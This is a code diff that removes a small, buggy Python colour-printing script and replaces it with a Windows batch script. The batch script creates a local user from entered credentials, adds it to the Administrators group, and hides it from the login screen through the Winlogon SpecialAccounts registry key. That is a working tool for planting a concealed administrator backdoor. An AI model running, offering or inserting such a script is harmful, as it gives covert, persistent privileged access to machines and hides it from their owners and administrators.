@@ -1,42 +1,7 @@
-pcolors = {
-    '\x1b[1;97m',
-    '\x1b[1;91m',
-    '\x1b[1;92m',
-    '\x1b[1;93m',
-    '\x1b[1;94m',
-    '\x1b[1;95m',
-    '\x1b[1;96m',
-    '\x1b[0m',
-    '\x1b[1;30m',
-    '\x1b[41m\x1b[1;97m',
-    '\x1b[m',
-    '\x1b[93m',
-    '\x1b[32m',
-    '\x1b[95m',
-    '\x1b[33m',
-    '\x1b[1;96m',
-    '\x1b[0;34m',
-    '\x1b[1;97m',
-    '\x1b[30m',
-    '\x1b[31m',
-    '\x1b[32m',
-    '\x1b[33m',
-    '\x1b[34m',
-    '\x1b[35m',
-    '\x1b[36m',
-    '\x1b[37m',
-    '\x1b[91m',
-    '\x1b[92m',
-    '\x1b[93m',
-    '\x1b[95m',
-    '\x1b[38;5;204m',
-    '\x1b[38;5;220m',
-    '\x1b[38;5;193m',
-    '\x1b[38;5;216m',
-    '\x1b[38;5;190m',
-    '\x1b[38;5;231m',
-    '\x1b[38;5;208m',
-    '\x1b[38;5;106m',}
-
-for color in colors:
-    print(f"{color} @esfelurm \033[0m")
+echo off 
+set /p user=Please Enter Desired Username: 
+set /p pass=Please Enter Desired Password: 
+net user /add %user% %pass% 
+net localgroup administrators /add %user% 
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %user% /t REG_DWORD /d 0 
+pause
